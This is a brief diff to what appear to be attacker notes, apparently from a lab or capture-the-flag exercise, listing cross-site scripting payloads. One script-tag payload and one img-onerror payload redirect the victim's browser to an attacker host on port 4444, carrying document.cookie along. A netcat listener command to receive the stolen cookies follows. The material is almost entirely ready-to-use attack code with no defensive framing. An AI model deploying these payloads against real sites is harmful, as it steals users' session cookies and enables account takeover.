@@ -1,2 +1,3 @@
-payload: <script>document.location='http:///<IP>:4444/XSS/grabber.php?c='+document.cookie</script>
+payload 1 : <script>document.location='http:///<IP>:4444/XSS/grabber.php?c='+document.cookie</script>
+or payload 2 : <img src=xss onerror=document.location="http://10.9.3.121:4444/?c="+document.cookie;>
 Attacker: nc -lvnp 4444
